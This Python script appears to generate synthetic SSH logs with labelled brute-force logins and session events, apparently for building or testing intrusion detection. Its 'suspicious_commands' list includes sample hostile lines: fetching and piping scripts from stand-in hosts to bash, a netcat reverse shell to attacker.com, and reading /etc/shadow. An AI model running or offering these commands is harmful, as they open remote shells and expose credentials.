#!/usr/bin/env python3
"""
SSH Log Generator
Generates realistic SSH authentication and session logs
"""

import random
import datetime
import json
from typing import List, Dict

class SSHLogGenerator:
    def __init__(self):
        self.legitimate_users = ['john', 'admin', 'root', 'developer', 'ops', 'backup']
        self.attacker_users = ['admin', 'root', 'test', 'guest', 'oracle', 'postgres', 'ubuntu']

        self.legitimate_ips = [f'192.168.1.{i}' for i in range(10, 50)]
        self.attacker_ips = [
            '103.45.67.89', '185.220.101.23', '45.154.24.45',
            '194.165.16.10', '91.219.237.229', '122.194.229.59'
        ]

        self.auth_methods = ['publickey', 'password', 'keyboard-interactive']
        self.ssh_versions = ['SSH-2.0-OpenSSH_7.4', 'SSH-2.0-OpenSSH_8.0', 'SSH-2.0-PuTTY']

    def generate_successful_login(self) -> Dict:
        """Generate a successful SSH login"""
        timestamp = datetime.datetime.now() - datetime.timedelta(
            seconds=random.randint(0, 86400)
        )

        user = random.choice(self.legitimate_users)
        source_ip = random.choice(self.legitimate_ips)

        return {
            'timestamp': timestamp.isoformat(),
            'event_type': 'authentication',
            'status': 'success',
            'user': user,
            'source_ip': source_ip,
            'source_port': random.randint(40000, 65000),
            'auth_method': random.choice(['publickey'] * 7 + ['password'] * 3),
            'session_id': f'session_{random.randint(10000, 99999)}',
            'ssh_version': random.choice(self.ssh_versions),
            'is_suspicious': False
        }

    def generate_failed_login(self) -> Dict:
        """Generate a failed SSH login"""
        timestamp = datetime.datetime.now() - datetime.timedelta(
            seconds=random.randint(0, 86400)
        )

        # Occasional legitimate failure vs brute force
        is_brute_force = random.random() < 0.7

        if is_brute_force:
            user = random.choice(self.attacker_users)
            source_ip = random.choice(self.attacker_ips)
            is_suspicious = True
        else:
            user = random.choice(self.legitimate_users)
            source_ip = random.choice(self.legitimate_ips)
            is_suspicious = False

        return {
            'timestamp': timestamp.isoformat(),
            'event_type': 'authentication',
            'status': 'failed',
            'user': user,
            'source_ip': source_ip,
            'source_port': random.randint(40000, 65000),
            'auth_method': 'password',
            'failure_reason': random.choice([
                'invalid_password',
                'invalid_user',
                'connection_closed',
                'timeout'
            ]),
            'ssh_version': random.choice(self.ssh_versions),
            'is_suspicious': is_suspicious,
            'attack_type': 'brute_force' if is_suspicious else None
        }

    def generate_session_event(self) -> Dict:
        """Generate SSH session event (command execution, file transfer, etc)"""
        timestamp = datetime.datetime.now() - datetime.timedelta(
            seconds=random.randint(0, 86400)
        )

        event_subtype = random.choice(['command', 'sftp', 'port_forward', 'disconnect'])
        user = random.choice(self.legitimate_users)

        log = {
            'timestamp': timestamp.isoformat(),
            'event_type': 'session',
            'event_subtype': event_subtype,
            'user': user,
            'source_ip': random.choice(self.legitimate_ips),
            'session_id': f'session_{random.randint(10000, 99999)}',
            'is_suspicious': False
        }

        if event_subtype == 'command':
            commands = [
                'ls -la', 'cd /var/log', 'tail -f syslog', 'ps aux',
                'systemctl status nginx', 'docker ps', 'git pull'
            ]
            suspicious_commands = [
                'wget http://malware.com/shell.sh',
                'curl evil.com | bash',
                'nc -e /bin/bash attacker.com 4444',
                'chmod +x /tmp/.hidden',
                'cat /etc/shadow'
            ]

            if random.random() < 0.1:  # 10% suspicious commands
                log['command'] = random.choice(suspicious_commands)
                log['is_suspicious'] = True
                log['attack_type'] = 'malicious_command'
            else:
                log['command'] = random.choice(commands)

        elif event_subtype == 'sftp':
            log['action'] = random.choice(['upload', 'download', 'delete'])
            log['file_path'] = f'/home/{user}/file_{random.randint(1, 100)}.txt'
            log['file_size'] = random.randint(1024, 10485760)

        elif event_subtype == 'port_forward':
            log['local_port'] = random.randint(1024, 65535)
            log['remote_host'] = random.choice(['localhost', '192.168.1.10'])
            log['remote_port'] = random.choice([3306, 5432, 6379, 8080])

        return log

    def generate_logs(self, count: int = 1000) -> List[Dict]:
        """Generate a mix of SSH logs"""
        logs = []

        # 60% successful logins, 20% failed, 20% session events
        success_count = int(count * 0.6)
        failed_count = int(count * 0.2)
        session_count = count - success_count - failed_count

        for _ in range(success_count):
            logs.append(self.generate_successful_login())

        for _ in range(failed_count):
            logs.append(self.generate_failed_login())

        for _ in range(session_count):
            logs.append(self.generate_session_event())

        logs.sort(key=lambda x: x['timestamp'])
        return logs

    def save_logs(self, logs: List[Dict], output_file: str, format: str = 'json'):
        """Save logs to file"""
        if format == 'json':
            with open(output_file, 'w') as f:
                json.dump(logs, f, indent=2)

        elif format == 'csv':
            import csv
            if logs:
                # Get all unique keys
                all_keys = set()
                for log in logs:
                    all_keys.update(log.keys())

                with open(output_file, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=sorted(all_keys))
                    writer.writeheader()
                    writer.writerows(logs)

        elif format == 'syslog':
            with open(output_file, 'w') as f:
                for log in logs:
                    if log['event_type'] == 'authentication':
                        syslog_entry = (
                            f"{log['timestamp']} sshd[{random.randint(1000, 9999)}]: "
                            f"{log['status'].upper()} {log['auth_method']} for {log['user']} "
                            f"from {log['source_ip']} port {log['source_port']}\n"
                        )
                    else:
                        syslog_entry = (
                            f"{log['timestamp']} sshd[{random.randint(1000, 9999)}]: "
                            f"session {log['event_subtype']} for {log['user']} "
                            f"from {log['source_ip']}\n"
                        )
                    f.write(syslog_entry)


if __name__ == '__main__':
    generator = SSHLogGenerator()

    print("Generating SSH logs...")
    logs = generator.generate_logs(count=1000)

    generator.save_logs(logs, '../data/ssh_logs.json', format='json')
    generator.save_logs(logs, '../data/ssh_logs.csv', format='csv')
    generator.save_logs(logs, '../logs/auth.log', format='syslog')

    print(f"Generated {len(logs)} SSH logs")
    suspicious = sum(1 for log in logs if log.get('is_suspicious', False))
    print(f"Suspicious logs: {suspicious} ({suspicious/len(logs)*100:.2f}%)")
